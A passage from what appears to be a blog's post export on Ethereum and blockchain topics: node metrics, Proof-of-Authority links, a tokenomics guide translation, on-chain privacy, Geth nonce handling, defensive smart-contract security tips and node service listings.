<td></td>
<td>Number of transactions</td>
</tr>
<tr>
<td>consensus_total_txs</td>
<td>Gauge</td>
<td>0.21.0</td>
<td></td>
<td>Total number of transactions committed</td>
</tr>
<tr>
<td>consensus_block_parts</td>
<td>counter</td>
<td>on dev</td>
<td>peer_id</td>
<td>number of blockparts transmitted by peer</td>
</tr>
<tr>
<td>consensus_latest_block_height</td>
<td>gauge</td>
<td>on dev</td>
<td></td>
<td>/status sync_info number</td>
</tr>
<tr>
<td>consensus_fast_syncing</td>
<td>gauge</td>
<td>on dev</td>
<td></td>
<td>either 0 (not fast syncing) or 1 (syncing)</td>
</tr>
<tr>
<td>consensus_block_size_bytes</td>
<td>Gauge</td>
<td>0.21.0</td>
<td></td>
<td>Block size in bytes</td>
</tr>
<tr>
<td>p2p_peers</td>
<td>Gauge</td>
<td>0.21.0</td>
<td></td>
<td>Number of peers node’s connected to</td>
</tr>
<tr>
<td>p2p_peer_receive_bytes_total</td>
<td>counter</td>
<td>on dev</td>
<td>peer_id, chID</td>
<td>number of bytes per channel received from a given peer</td>
</tr>
<tr>
<td>p2p_peer_send_bytes_total</td>
<td>counter</td>
<td>on dev</td>
<td>peer_id, chID</td>
<td>number of bytes per channel sent to a given peer</td>
</tr>
<tr>
<td>p2p_peer_pending_send_bytes</td>
<td>gauge</td>
<td>on dev</td>
<td>peer_id</td>
<td>number of pending bytes to be sent to a given peer</td>
</tr>
<tr>
<td>p2p_num_txs</td>
<td>gauge</td>
<td>on dev</td>
<td>peer_id</td>
<td>number of transactions submitted by each peer_id</td>
</tr>
<tr>
<td>p2p_pending_send_bytes</td>
<td>gauge</td>
<td>on dev</td>
<td>peer_id</td>
<td>amount of data pending to be sent to peer</td>
</tr>
<tr>
<td>mempool_size</td>
<td>Gauge</td>
<td>0.21.0</td>
<td></td>
<td>Number of uncommitted transactions</td>
</tr>
<tr>
<td>mempool_tx_size_bytes</td>
<td>histogram</td>
<td>on dev</td>
<td></td>
<td>transaction sizes in bytes</td>
</tr>
<tr>
<td>mempool_failed_txs</td>
<td>counter</td>
<td>on dev</td>
<td></td>
<td>number of failed transactions</td>
</tr>
<tr>
<td>mempool_recheck_times</td>
<td>counter</td>
<td>on dev</td>
<td></td>
<td>number of transactions rechecked in the mempool</td>
</tr>
<tr>
<td>state_block_processing_time</td>
<td>histogram</td>
<td>on dev</td>
<td></td>
<td>time between BeginBlock and EndBlock in ms</td>
</tr>
</tbody></table>
]]></content>
      <tags>
        <tag>共识算法</tag>
      </tags>
  </entry>
  <entry>
    <title>关于PoA-Proof-of-Authority-Chains</title>
    <url>/2022/02/05/%E5%85%B3%E4%BA%8EPoA-Proof-of-Authority-Chains/</url>
    <content><![CDATA[<p>Proof-of-Authority is a replacement for Proof-of-Work, already working in production of Ethereum, like <a href="https://openethereum.github.io/Proof-of-Authority-Chains">OpenEthereum</a>, <a href="https://geth.ethereum.org/">geth</a>.</p>
<h4 id="This-article-show-path-of-dev-and-move-to-production-steps-as-my-github-project-WillZhuang-geth-poa-tutorial-Clique-Proof-of-Authority-Tutorial-github-com-it-is-working-under-Geth-v1-10-15"><a href="#This-article-show-path-of-dev-and-move-to-production-steps-as-my-github-project-WillZhuang-geth-poa-tutorial-Clique-Proof-of-Authority-Tutorial-github-com-it-is-working-under-Geth-v1-10-15" class="headerlink" title="This article show path of dev, and move to production steps as my github project: WillZhuang/geth-poa-tutorial: Clique Proof-of-Authority Tutorial (github.com). it is working under Geth v1.10.15."></a>This article show path of dev, and move to production steps as my github project: <a href="https://github.com/WillZhuang/geth-poa-tutorial">WillZhuang/geth-poa-tutorial: Clique Proof-of-Authority Tutorial (github.com)</a>. it is working under Geth v1.10.15.</h4><p><strong>appendix:</strong></p>
<ol>
<li>guide about node append / delete : <a href="https://geth.ethereum.org/docs/rpc/ns-clique">https://geth.ethereum.org/docs/rpc/ns-clique</a>.</li>
</ol>
<p><code>clique.propose(address, auth)</code> / <code>clique.discard(address)</code></p>
<ol start="2">
<li><p>Original <a href="https://eips.ethereum.org/EIPS/eip-225">EIP-225: Clique proof-of-authority consensus protocol (ethereum.org)</a></p>
</li>
<li><p>benchmark: <a href="https://github.com/drandreaskrueger/chainhammer">drandreaskrueger/chainhammer: fire many transactions at Ethereum node, then produce diagrams of TPS, blocktime, gasUsed and gasLimit, and blocksize. (github.com)</a></p>
</li>
</ol>
<p>CBDC pay attention on PoA:</p>
<ul>
<li><p><a href="https://www.hkma.gov.hk/media/eng/doc/key-functions/financial-infrastructure/Inthanon-LionRock_to_mBridge_Building_a_multi_CBDC_platform_for_international_payments.pdf">Inthanon-LionRock to mBridge: Building a multi CBDC platform for international payments (hkma.gov.hk)</a></p>
</li>
<li><p>The Joinup under European Commission report on 2019 : <a href="https://joinup.ec.europa.eu/collection/blockchain-egov-services/document/user-guide-how-setup-private-ethereum-poa-blockchain-network">User guide on how to setup a private Ethereum POA Blockchain Network | Joinup (europa.eu)</a></p>
</li>
<li><p><a href="https://www.banque-france.fr/sites/default/files/media/2021/11/09/821338_rapport_mnbc-04.pdf">page 20 /_rapport_mnbc-04.pdf (banque-france.fr)</a> </p>
</li>
<li><p>[CBDC Report Final.pdf (eublockchainforum.eu)](<a href="https://www.eublockchainforum.eu/sites/default/files/reports/CBDC">https://www.eublockchainforum.eu/sites/default/files/reports/CBDC</a> Report Final.pdf)</p>
</li>
<li><p><a href="https://wiki.hyperledger.org/display/events/Global+CBDC+Challenge">Global CBDC Challenge - Community of Hyperledger</a></p>
</li>
</ul>
]]></content>
      <tags>
        <tag>Ethereum</tag>
      </tags>
  </entry>
  <entry>
    <title>关于Token使用方法和价值的商业指南</title>
    <url>/2018/03/04/%E5%85%B3%E4%BA%8EToken%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E5%92%8C%E4%BB%B7%E5%80%BC%E7%9A%84%E5%95%86%E4%B8%9A%E6%8C%87%E5%8D%97/</url>
    <content><![CDATA[<p>原文: <a href="http://startupmanagement.org/2017/06/10/tokenomics-a-business-guide-to-token-usage-utility-and-value/">http://startupmanagement.org/2017/06/10/tokenomics-a-business-guide-to-token-usage-utility-and-value/</a></p>
<hr>
<p>关于加密货币代币的关注和材料非常多，但它们还没有一个主流定义。在区块链的技术领域，加密货币的概念很好理解。它代表了一种可编程的货币单位，它被固定在区块链上，是特定软件应用环境中智能合约逻辑的一部分。 但在非技术领域，是什么？</p>
<p>Token 只是私人发行货币的另一个术语。传统上，主权国家政府发行货币并设定其条款和治理；实质上是指导我们的经济如何与金钱作为价值的交换媒介。通过区块链，我们现在可以以数字货币形式发行自己的货币，将其作为加密货币的新型组织，他们正在为其运营设置自己的条款和规则。本质上，创造新的自我可持续的小型经济体。</p>
<p>政府的权限现在掌握在许多人手中。</p>
<p>在商业领域，我们可以将 Token 定义为：</p>
<blockquote>
<p>一个组织为了自治其商业模式而创建的价值单位，并赋予其用户与其产品互动的权力，同时促进向所有利益相关者分配和分享奖励和利益。</p>
</blockquote>
<p>Token 模型的致命弱点是如何将它们与商业模型进行交互。然而，多数关注点都集中于设计ICO来优化加密经济学(cryptoconomics)，即，根据给定的销售和所有权结构，这个术语描述了 Token 分布的机制和具体情况。</p>
<p>展望未来，Token 使用方法将比其潜在的加密经济学(cryptoconomics)设计重要得多。正如此文指出的那样，<a href="https://blog.gdax.com/the-perfect-token-sale-structure-63c169789491">没有完美的Token销售结构</a>。您可以精确地设计一个ICO，让它正确地启动起来，但是，长期来看，您商业模式需要是可行的。</p>
<p>在2015年初，我在<a href="http://startupmanagement.org/2015/02/04/an-operational-framework-for-decentralized-autonomous-organizations/">分布式自治组织运营框架</a>的一文中，解释了 Token 的用法，并且我总结了一些使用模型，包括现在正在使用的 <em>权利，奖励和工作</em> 模型。 我写的大部分内容今天适用，尤其是这部分：</p>
<blockquote>
<p>“DAO的主要目标是创造价值，为了实现这一目标，需要在用户行为与对组织整体价值的影响之间建立特定联系。”</p>
<p>“没有价值链接将是浪费，最终导致失败。新的DAO就像一个初创公司。它需要产品与市场相契合，实现商业模式以及服务（很多）用户/客户。”</p>
</blockquote>
<p>Token 的<em>角色</em>成为<em>权力</em>模型的首要因素。Token 是多用途的工具，我们开始更加清晰地看到 Token 如何应用。</p>
<p>在分析了数十个过去和即将到来的ICO后，我对Token的作用，特征和目的进行了以下全面的分类。 这将有助于未来和现有的ICO公司进行磨合，并将精力集中到未来成功的重要因素上。</p>
<p>我建议的框架有3个用于Token实用程序的原则：</p>
<h5 id="角色-特征-目的"><a href="#角色-特征-目的" class="headerlink" title="角色 - 特征 - 目的"></a>角色 - 特征 - 目的</h5><p><img src="/2018/03/04/%E5%85%B3%E4%BA%8EToken%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E5%92%8C%E4%BB%B7%E5%80%BC%E7%9A%84%E5%95%86%E4%B8%9A%E6%8C%87%E5%8D%97/1.png"></p>
<p>每个角色都有一个关键的目的，如下图所示。</p>
<p><img src="/2018/03/04/%E5%85%B3%E4%BA%8EToken%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E5%92%8C%E4%BB%B7%E5%80%BC%E7%9A%84%E5%95%86%E4%B8%9A%E6%8C%87%E5%8D%97/2.png"></p>
<h5 id="权利"><a href="#权利" class="headerlink" title="权利"></a>权利</h5><p>拥有Token可赋予产品使用权，治理，贡献，投票权，市场访问权。在一些案例中，Token 可以准许赋予真实的所有权，例如，Numerai，DigixDAO，FirstBlood和Tezos。</p>
<p>价值交换<br>Token也是特定市场或应用的价值交换的原子单位，在买卖双方之间创造交易经济。这包括允许用户获得价值，并将其花费在生态系统内部的服务和功能上。他们可以通过积极工作（实际工作和行动）或被动工作（例如共享数据）来赚取收入。这种内部经济的创造可以说是最重要的结果之一，而且必须持续一段时间。例如，Steemit，Kik，Tezos和Augur。</p>
<h5 id="收费"><a href="#收费" class="headerlink" title="收费"></a>收费</h5><p>就像支付高速公路的费用一样，Token 可以用于区块链基础设施或使用产品的按次付费。这也确保了用户在游戏中拥有皮肤。它可以包括运行智能合约以执行特定功能，支付保证金或以交易费用或其他计量指标的形式使用费。例如，Gnosis，Augur，Melonport，Tezos，Dfinity，Ethereum和Bitcoin。</p>
<h5 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h5><p>Token还可以用作杠杆来丰富用户体验，包括加入网络或与用户连接等基本操作。也可以作为奖励，例如作为开始使用或加入的汇报。例如，Dfinity，Steemit，Civic和Brave。</p>
<h5 id="货币"><a href="#货币" class="headerlink" title="货币"></a>货币</h5><p>Token是一种非常有效的支付方式和交易引擎。这是在这些封闭环境中实现无摩擦事务的关键。这是第一次，公司可以成为他们自己的支付处理器，而无需繁琐且昂贵的传统财务结算选项。在特定市场内，Token为端对端交易无障碍的运行提供了保障。</p>
<h5 id="收入"><a href="#收入" class="headerlink" title="收入"></a>收入</h5><p>基于区块链模型，由此而产生的增值部分被公平地再分配。包括利润分享，利益分配，其他利益（例如通货膨胀），预计与所有利益相关者分享利益。</p>
<h5 id="评估Token效用"><a href="#评估Token效用" class="headerlink" title="评估Token效用"></a>评估Token效用</h5><p>在评估一个给定的Token组织时，与Token角色相关的勾选框，能够勾选的项越多则越好。Token的作用就像钉入商业模式的钉子一样。你不仅需要一个结实的地方，而且要保证可持续性。</p>
<p>这正式企业家创造力一直在闪耀的地方，因为他们可以发明创造了许多Token可以使用的方法，像橡胶满足公路的发展一样。这是令人兴奋的创新。</p>
<p>如果Token用法不明确，没有很好的解释，那么该模型就存在问题。</p>
<p>我不确定应用程序Token与协议Token是否是Token分类的正确方法。目前还犹未可知。</p>
<p>这里提出了一组建议的问题。如果你是一个以ICO为基础的组织，给每一个肯定回答1分，总计最多20分：</p>
<ol>
<li>Token是否与产品使用情况相关联，即它是否允许用户对其进行独占访问，或为产品提供交互权限？</li>
<li>Token是否授予治理行为，如对共识相关或其他决策因素进行投票？</li>
<li>Token是否使用户能够为正在构建的网络或市场提供增值操作？</li>
<li>Token是否授予排序的所有权，无论它是真实的还是代指的？</li>
<li>Token是否会根据用户的行为（活跃工作）产生可获利的奖励？</li>
<li>Token是否授予用户基于共享或公开某些有关它们的数据（被动工作）的价值？</li>
<li>是购买某种商业模式的一部分？</li>
<li>是卖东西的商业模式的一部分？</li>
<li>用户可以创建新的产品或服务吗？</li>
<li>运行智能合同或资助预言机需要的Token吗？ （预言机是智能合约可以使用的信息或数据来源）</li>
<li>是否需要Token作为安全存款以确保区块链操作的某些方面？</li>
<li>Token（或其衍生物，如稳定的硬币或气体单位）是否用于支付某些用途？</li>
<li>加入网络或其他相关实体需要Token吗？</li>
<li>Token是否启用用户之间的真实连接？</li>
<li>作为鼓励产品试用或使用的动机，是否以折扣形式提供或提供Token？</li>
<li>Token是您的主要付款单位，基本上是作为内部货币运作的吗？</li>
<li>Token（或其衍生产品）是所有内部交易的主要会计单位吗？</li>
<li>您的区块链是否自动向代币持有者分配利润？</li>
<li>您的区块链是否会自动为代币持有者分配其他好处？</li>
<li>内置货币通胀情况下，用户是否有相关的好处？</li>
</ol>
<p>谨记：基于上述题目，即使公司取得了高分，仍然需要彻底的执行它。对于成功而言，这份清单是必要条件。</p>
<p>我们鼓励所有基于ICO的公司审查其Token使用情况。他们可以检查的使用场景越多，其Token-to-Market契合度则可能越高。</p>
]]></content>
      <tags>
        <tag>Token</tag>
      </tags>
  </entry>
  <entry>
    <title>关于ethereum隐私数据的现状</title>
    <url>/2019/07/24/%E5%85%B3%E4%BA%8Eethereum%E9%9A%90%E7%A7%81%E6%95%B0%E6%8D%AE%E7%9A%84%E7%8E%B0%E7%8A%B6/</url>
    <content><![CDATA[<h3 id="一句话概述：以太坊上没有隐私数据"><a href="#一句话概述：以太坊上没有隐私数据" class="headerlink" title="一句话概述：以太坊上没有隐私数据"></a>一句话概述：以太坊上没有隐私数据</h3><h5 id="private-声明帮不了你"><a href="#private-声明帮不了你" class="headerlink" title="private 声明帮不了你"></a>private 声明帮不了你</h5><p><code>string private secret;</code></p>
<p>如上，将变量设置为private只是确保仅通过特定的 function 才能够更改变量的值。但就数据的隐私性“private”而言，这是没用的。基本上，以太坊smart contract上的所有内容都在（所有）节点（即所有矿工和参与者）的硬盘上，私有变量只是为了使阅读不方便，但并不意味着不可能。它不足以保护您的敏感、隐私信息。如下图所示。<br>而且，smart contract 的代码是透明的，private 的变量声明是很容易被以太坊用户识别的。</p>
<p><img src="/2019/07/24/%E5%85%B3%E4%BA%8Eethereum%E9%9A%90%E7%A7%81%E6%95%B0%E6%8D%AE%E7%9A%84%E7%8E%B0%E7%8A%B6/setsecret.png"></p>
<p><img src="/2019/07/24/%E5%85%B3%E4%BA%8Eethereum%E9%9A%90%E7%A7%81%E6%95%B0%E6%8D%AE%E7%9A%84%E7%8E%B0%E7%8A%B6/rawdata.png"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0x5 - length of the string</span><br><span class="line">0x68 - h (ASCII code 104)</span><br><span class="line">0x65 - e</span><br><span class="line">0x6c - l</span><br><span class="line">0x6c - l</span><br><span class="line">0x6f - o</span><br></pre></td></tr></table></figure>

<h4 id="private-data-上链的方式如下，但是都觉得是隔靴搔痒："><a href="#private-data-上链的方式如下，但是都觉得是隔靴搔痒：" class="headerlink" title="private data 上链的方式如下，但是都觉得是隔靴搔痒："></a>private data 上链的方式如下，但是都觉得是隔靴搔痒：</h4><p>1.hash 上链，作为存证的证明</p>
<p>2.密文上链。</p>
<p>3.时间锁 Time-locked secrets</p>
<p>4.EIP1024</p>
<p>请参考：<a href="https://www.coindesk.com/four-projects-seek-solve-ethereums-privacy-paradox">How to secure Sensitive data on an Ethereum Smart contract?</a></p>
]]></content>
      <tags>
        <tag>Ethereum</tag>
      </tags>
  </entry>
  <entry>
    <title>关于nonce-too-high问题的详细分析</title>
    <url>/2019/12/26/%E5%85%B3%E4%BA%8Enoce-too-high%E9%97%AE%E9%A2%98%E7%9A%84%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h3 id="关于ethereum-中，nonce问题总结："><a href="#关于ethereum-中，nonce问题总结：" class="headerlink" title="关于ethereum 中，nonce问题总结："></a>关于ethereum 中，nonce问题总结：</h3><ul>
<li>Tx 中 nonce 过低（too low）时，Tx 立即被拒绝</li>
<li>Tx 中 nonce 过高（too high）时，Tx 被放入交易池队列 transaction pool queue</li>
<li>如果 Tx 的 nonce 正好填补了最新的有效的 nonce 和过高的nonce之间的空隙，是的nonce的顺序完整连接时，交易池队列中的交易将被执行</li>
<li>当 Geth 被关掉或者重新启动时，交易池中的 Txs 将消失</li>
</ul>
<h3 id="nonce问题，详细介绍："><a href="#nonce问题，详细介绍：" class="headerlink" title="nonce问题，详细介绍："></a>nonce问题，详细介绍：</h3><ul>
<li>当 Tx 中 nonce 过低时，</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> eth.sendTransaction(&#123;from: eth.accounts[0], to: eth.accounts[1], value: web3.toWei(1, <span class="string">&quot;ether&quot;</span>), nonce:0&#125;)</span></span><br><span class="line">Nonce too low</span><br><span class="line">    at InvalidResponse (&lt;anonymous&gt;:-81662:-106)</span><br><span class="line">    at send (&lt;anonymous&gt;:-156322:-106)</span><br><span class="line">    at sendTransaction (&lt;anonymous&gt;:-133322:-106)</span><br><span class="line">    at &lt;anonymous&gt;:1:1</span><br></pre></td></tr></table></figure>

<ul>
<li>当 Tx 中 nonce 过高时，</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> txpool.status</span></span><br><span class="line">&#123;</span><br><span class="line">  pending: 0,</span><br><span class="line">  queued: 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>Geth 重启时，</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> txpool.status</span></span><br><span class="line">&#123;</span><br><span class="line">  pending: 0,</span><br><span class="line">  queued: 0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><ul>
<li><p>在应用本地保存nonce在数据库中，并且，数据库中的nonce值更新时需要访问锁保护。不建议将nonce保存在内存中，那样的话，在应用死机或者重启时，nonce将丢失。目前思考 Redis DB 是比较好的选择。</p>
</li>
<li><p>如果本地nonce出了问题，可以使用 <code>web3.eth.getTransactionCount(ethAddress)</code> 来恢复。但是 <code>web3.eth.getTransactionCount(ethAddress)</code> 是内存中的值，不是实时准确的，不建议实时使用。</p>
</li>
</ul>
<p>另外：</p>
<ul>
<li><p>即使交易池（queue）中有交易存在，nonce正确的交易仍然可以继续进行。</p>
</li>
<li><p>当共识停止工作了，nonce正确的交易进入到pending队列中，nonce较高的交易进入到queue队列中。当共识重新正常工作时，pending队列中的交易会被自动处理而清空。</p>
</li>
<li><p>同时节点具有每隔一个小时，重新处理一次本地交易的能力。（handle local transaction journal rotation）</p>
</li>
</ul>
<p>参考链接 ==&gt; <a href="https://ethereum.stackexchange.com/questions/2808/what-happens-when-a-transaction-nonce-is-too-high">https://ethereum.stackexchange.com/questions/2808/what-happens-when-a-transaction-nonce-is-too-high</a></p>
<p>参考代码 ==&gt; </p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">ethereum/<span class="keyword">go</span>-ethereum/core/tx_pool.<span class="keyword">go</span> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(pool *TxPool)</span> <span class="title">loop</span><span class="params">()</span></span> &#123;</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>本问题调查过程中，使用到的命令==&gt;</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">eth.getTransactionCount(eth.accounts[0])</span><br><span class="line"></span><br><span class="line">personal.unlockAccount(eth.accounts[0],&quot;1234&quot;,99999)</span><br><span class="line"></span><br><span class="line">eth.sendTransaction(&#123;from:eth.accounts[0],to:eth.accounts[0],value:100,nonce:200&#125;)</span><br><span class="line"></span><br><span class="line">txpool.status</span><br><span class="line"></span><br><span class="line">eth.sendTransaction(&#123;from:eth.accounts[0],to:eth.accounts[0]&#125;)</span><br><span class="line"></span><br><span class="line">txpool.status</span><br><span class="line"></span><br><span class="line">./odyssey update_Validator localhost:26657 UpdateValidator:OA+kUHbBDxh6q2kqF1jNQFoPqjTYsTS2m17un4Z9vI0=*/*10000</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Ethereum</tag>
      </tags>
  </entry>
  <entry>
    <title>关于以太坊智能合约的新认知</title>
    <url>/2019/06/10/%E5%85%B3%E4%BA%8E%E4%BB%A5%E5%A4%AA%E5%9D%8A%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E7%9A%84%E6%96%B0%E8%AE%A4%E7%9F%A5/</url>
    <content><![CDATA[<h4 id="1-智能合约是可以删除的"><a href="#1-智能合约是可以删除的" class="headerlink" title="1. 智能合约是可以删除的"></a>1. 智能合约是可以删除的</h4><p>删除智能合约的 EVM 字节码为 SELFDESTRUCT (之前称为 SUICIDE)。该操作系统会提供 gas 退款，激励用户删除存储状态的方式释放资源。删除智能合约并不会清楚合约之前历史的交易记录，区块链本身并不可改变。</p>
<h4 id="2-Solidity-目前的版本号码是Version-0-5-9"><a href="#2-Solidity-目前的版本号码是Version-0-5-9" class="headerlink" title="2. Solidity 目前的版本号码是Version 0.5.9"></a>2. Solidity 目前的版本号码是<a href="https://github.com/ethereum/solidity/releases/tag/v0.5.9">Version 0.5.9</a></h4><p>其中主版本号是 0，它表示任何东西都有可能修改。次版本号是 5，在 Solidity 实际编码中，次版本号视为主版本号。9 为补丁号，实际编码中视为次版本号。当然建议开发者使用最新的版本。</p>
<h4 id="3-ABI，Application-Binary-Interface，应用程序二进制接口"><a href="#3-ABI，Application-Binary-Interface，应用程序二进制接口" class="headerlink" title="3. ABI，Application Binary Interface，应用程序二进制接口"></a>3. ABI，Application Binary Interface，应用程序二进制接口</h4><p>ABI 定义了数据结构和函数如何在机器指令中被访问。ABI 是向机器指令层面编码和解码并传送数据的主要方式。与 API 不同。ABI 对智能合约进行编码，具体是对 EVM 的调用和从交易获取数据的调用进行编码。例如，钱包软件调用 withdraw 函数时，需要通过 ABI 知道，该调用需要一个 uint256 类型的变量，变量名称为 withdraw_amount。然后钱包软件就会提示用户输入该参数，接着创建一个以太坊交易，调用合约的 withdraw 函数。</p>
<h4 id="4-智能合约设计中的安全设计模式"><a href="#4-智能合约设计中的安全设计模式" class="headerlink" title="4. 智能合约设计中的安全设计模式"></a>4. 智能合约设计中的安全设计模式</h4><h5 id="4-1-重入：典型案例为DAO。"><a href="#4-1-重入：典型案例为DAO。" class="headerlink" title="4.1 重入：典型案例为DAO。"></a>4.1 重入：典型案例为DAO。</h5><ul>
<li><p>尽可能地使用内置的 transfer 函数想外部合约发送以太币。因为 transfer 仅会给外部调用2300gas，所以不足以支持目标地址或者合约再次调用其他合约，也就不足以重入发送以太币的合约。避免使用 send 或者 call。</p>
</li>
<li><p>确保状态变量的修改都发生在合约发送以太币之前。即按照”检查-生效-交互”模式。</p>
</li>
<li><p>引入互斥锁，也就是增加一个状态变量在代码执行中锁定合约，避免重入的调用。请参照<a href="https://willzhuang.github.io/2020/09/18/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E9%80%80%E6%AC%BE%E6%96%B9%E5%BC%8F/">智能合约退款方式一文</a>。</p>
</li>
</ul>
<h5 id="4-2-溢出：典型案例为美团币被盗。"><a href="#4-2-溢出：典型案例为美团币被盗。" class="headerlink" title="4.2 溢出：典型案例为美团币被盗。"></a>4.2 溢出：典型案例为美团币被盗。</h5><p>使用 openzeppelin 的 safemath 做计算防范溢出。</p>
<h5 id="4-3-以太币余额逻辑陷阱：典型案例为游戏应用中的存-ether，中奖-ether漏洞。"><a href="#4-3-以太币余额逻辑陷阱：典型案例为游戏应用中的存-ether，中奖-ether漏洞。" class="headerlink" title="4.3 以太币余额逻辑陷阱：典型案例为游戏应用中的存 ether，中奖 ether漏洞。"></a>4.3 以太币余额逻辑陷阱：典型案例为游戏应用中的存 ether，中奖 ether漏洞。</h5><ul>
<li><p>避免使用 this.balance 的具体数值，它可能会被操纵。</p>
</li>
<li><p>如果需要判断以太币的具体充值数额，可以使用一个自定义的变量在 payable 的数字中记录数额的变动。需要保证这个变量不会被 selfdestruct 调用强制发送的以太币所影响。</p>
</li>
</ul>
<h5 id="4-4-尽量避免使用-DELEGATECALL，尽量使用-library。保持库合约是无状态的，不会selfdestruct自我销毁的。典型案例-Parity-多重签名钱包的第二次共计漏洞。"><a href="#4-4-尽量避免使用-DELEGATECALL，尽量使用-library。保持库合约是无状态的，不会selfdestruct自我销毁的。典型案例-Parity-多重签名钱包的第二次共计漏洞。" class="headerlink" title="4.4 尽量避免使用 DELEGATECALL，尽量使用 library。保持库合约是无状态的，不会selfdestruct自我销毁的。典型案例 Parity 多重签名钱包的第二次共计漏洞。"></a>4.4 尽量避免使用 DELEGATECALL，尽量使用 library。保持库合约是无状态的，不会selfdestruct自我销毁的。典型案例 Parity 多重签名钱包的第二次共计漏洞。</h5><h5 id="4-5-保持正确的可见性，public-private-internal，不建议省略，因为省略即为-public。"><a href="#4-5-保持正确的可见性，public-private-internal，不建议省略，因为省略即为-public。" class="headerlink" title="4.5 保持正确的可见性，public/private/internal，不建议省略，因为省略即为 public。"></a>4.5 保持正确的可见性，public/private/internal，不建议省略，因为省略即为 public。</h5><h5 id="4-6-区块链上的随机性目前还是一个难题。使用过往或者最近的变量都是灾难性的。"><a href="#4-6-区块链上的随机性目前还是一个难题。使用过往或者最近的变量都是灾难性的。" class="headerlink" title="4.6 区块链上的随机性目前还是一个难题。使用过往或者最近的变量都是灾难性的。"></a>4.6 区块链上的随机性目前还是一个难题。使用过往或者最近的变量都是灾难性的。</h5><p>随机数必须来自区块链外部。或者，由像”提交-揭示”这样的模式在节点之间来实现。或者通过更改一组参与者之间的信任模型来实现。例如：<a href="https://github.com/randao/randao">randao</a> , <a href="https://github.com/oraclize">oraclize</a> 。</p>
<h5 id="4-7-参数攻击"><a href="#4-7-参数攻击" class="headerlink" title="4.7 参数攻击"></a>4.7 参数攻击</h5><p>向智能合约传递参数时，这些参数需要依照 ABI 规范进行编码。不过，发送的实际数据长度小于标准的参数编码长度也是可以的。在这种情况下，EVM 会在数据末尾补 0 使得数据长度达到要求。这可能会引起实际的转账以太币数量增长 10 倍，100倍甚至更高。防范方法是外部应用程序在把输入参数发送到区块链之前都应该对它们进行校验。由于数据填充发生在尾部，所以在合约中仔细考虑参数的顺序也可以在一定程度上减轻共计的危害。</p>
<h5 id="4-8-Tx-Origin"><a href="#4-8-Tx-Origin" class="headerlink" title="4.8 Tx.Origin"></a>4.8 Tx.Origin</h5><p>智能合约中不应该使用Tx.Origin来进行验证授权。攻击者可以将共计合约的地址伪装成权限拥有人的地址，这样就可以通过验证，操作后续的（提款）逻辑。</p>
<p>Don’t roll your own crypto!</p>
]]></content>
      <tags>
        <tag>Ethereum</tag>
      </tags>
  </entry>
  <entry>
    <title>关于区块链节点服务治理</title>
    <url>/2020/11/18/%E5%85%B3%E4%BA%8E%E5%8C%BA%E5%9D%97%E9%93%BE%E8%8A%82%E7%82%B9%E6%9C%8D%E5%8A%A1%E6%B2%BB%E7%90%86/</url>
    <content><![CDATA[<h3 id="1-https-ethereumnodes-com"><a href="#1-https-ethereumnodes-com" class="headerlink" title="1. https://ethereumnodes.com/"></a>1. <a href="https://ethereumnodes.com/">https://ethereumnodes.com/</a></h3><p>该网页内收集了以太坊各个节点的服务。如：Infura、Alchemy、MyCrypto等</p>
<h3 id="2-https-dashboard-alchemyapi-io"><a href="#2-https-dashboard-alchemyapi-io" class="headerlink" title="2. https://dashboard.alchemyapi.io/"></a>2. <a href="https://dashboard.alchemyapi.io/">https://dashboard.alchemyapi.io/</a></h3><p>Alchemy Supernode是最广泛使用的以太坊API。获得节点的所有功能，包括JSON-RPC支持，直接从dashboard进行JSON-RPC调用，并快速扫描最近的请求和错误。Alchemy Notify允许开发人员将实时推送通知发送给用户，以进行挖矿，延迟和掉落的交易，赚取的利息，已烧掉的令牌和其他重要事件。包括强大的网络钩子和一键式集成。Alchemy Monitor是一套全面的仪表板和警报，可用于检测应用程序的运行状况，性能和用户行为。</p>
<p>用户包括：kyber network、0x、MEW、opensea等等</p>
<h3 id="3-https-mycrypto-com"><a href="#3-https-mycrypto-com" class="headerlink" title="3. https://mycrypto.com/"></a>3. <a href="https://mycrypto.com/">https://mycrypto.com/</a></h3><p>MyCrypto是一个开放源代码的客户端工具，用于生成以太币钱包，处理转账、合约管理等功能。自2015年以来，由社区开发并为社区开发。</p>
<h3 id="4-EtherAddressLookup"><a href="#4-EtherAddressLookup" class="headerlink" title="4. EtherAddressLookup"></a>4. <a href="https://chrome.google.com/webstore/detail/etheraddresslookup/pdknmigbbbhmllnmgdfalmedcmcefdfn">EtherAddressLookup</a></h3><ul>
<li><p>使以太坊地址（和ENS地址）成为您喜欢的区块浏览器的链接。</p>
</li>
<li><p>使用0x地址或交易哈希搜索区块链，并获得可读的结果。</p>
</li>
<li><p>在地址中添加标签-可以在地址中添加可读标签，则无需记住较长的十六进制字符串。创建与区块浏览器功能集成的自己的地址簿。</p>
</li>
<li><p>阻止您进入恶意域，EAL会每天更新一次已知钓鱼域的黑名单，以帮助您保护资金/秘密安全。黑名单每10分钟保存在本地到扩展程序中，以保持您的隐私完整。您唯一一次点击第三方服务的时间是该扩展程序缓存黑名单时，服务方是Github。</p>
</li>
<li><p>等等功能。</p>
</li>
</ul>
